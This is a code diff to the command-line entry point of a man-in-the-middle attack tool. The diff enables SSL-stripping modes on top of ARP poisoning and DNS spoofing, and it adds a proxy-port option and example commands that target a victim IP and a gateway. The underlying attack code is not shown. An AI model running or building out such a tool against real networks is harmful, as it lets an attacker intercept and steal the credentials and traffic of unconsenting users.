@@ -5,13 +5,15 @@ Supports multiple attack modes:
 - arp-only: ARP poisoning only
 - dns-only: DNS spoofing (race attack)
 - arp-dns: ARP poisoning + DNS spoofing (reliable MITM)
-- arp-ssl: ARP poisoning + SSL stripping (stub)
-- arp-dns-ssl: Complete attack (stub)
+- arp-ssl: ARP poisoning + SSL stripping
+- arp-dns-ssl: Complete attack (ARP + DNS + SSL)
 
 Usage:
     python main.py run --mode arp-only --victim-ip 10.0.0.20 --target-ip 10.0.0.1
     python main.py run --mode dns-only --victim-ip 10.0.0.20 --dns-rules dns_rules.json
     python main.py run --mode arp-dns --victim-ip 10.0.0.20 --target-ip 10.0.0.1 --dns-rules dns_rules.json
+    python main.py run --mode arp-ssl --victim-ip 10.0.0.20 --target-ip 10.0.0.1
+    python main.py run --mode arp-dns-ssl --victim-ip 10.0.0.20 --target-ip 10.0.0.1 -d dns_rules.json
     python main.py discover
 """
 
@@ -67,6 +69,7 @@ def cli():
 @click.option("--interface", "-i", default=None, help="Network interface to use (default: auto-detect).")
 @click.option("--dns-rules", "-d", type=click.Path(exists=False), default=None, help="Path to JSON file with DNS spoofing rules.")
 @click.option("--silent", "-s", is_flag=True, default=False, help="Silent mode: listen for ARP requests instead of continuous poisoning (ARP only).")
+@click.option("--ssl-proxy-port", "-p", default=8080, type=int, help="Port for SSL stripping proxy (default: 8080).")
 def run(
     mode: str,
     victim_ip: str,
@@ -74,6 +77,7 @@ def run(
     interface: str | None,
     dns_rules: str | None,
     silent: bool,
+    ssl_proxy_port: int,
 ) -> None:
     """
     MITM Attack Tool - ARP Poisoning, DNS Spoofing, SSL Stripping.
@@ -82,6 +86,8 @@ def run(
         python main.py run --mode arp-only --victim-ip 10.0.0.20 --target-ip 10.0.0.1
         python main.py run --mode dns-only --victim-ip 10.0.0.20 -d dns_rules.json
         python main.py run --mode arp-dns --victim-ip 10.0.0.20 --target-ip 10.0.0.1 -d dns_rules.json
+        python main.py run --mode arp-ssl --victim-ip 10.0.0.20 --target-ip 10.0.0.1
+        python main.py run --mode arp-dns-ssl --victim-ip 10.0.0.20 --target-ip 10.0.0.1 -d dns_rules.json
     """
 
     # Validate mode requirements
@@ -130,6 +136,7 @@ def run(
         gateway_ip=target_ip,
         dns_rules=dns_rules_dict,
         silent=silent,
+        ssl_proxy_port=ssl_proxy_port,
     )
 
     manager = AttackManager(config=config)
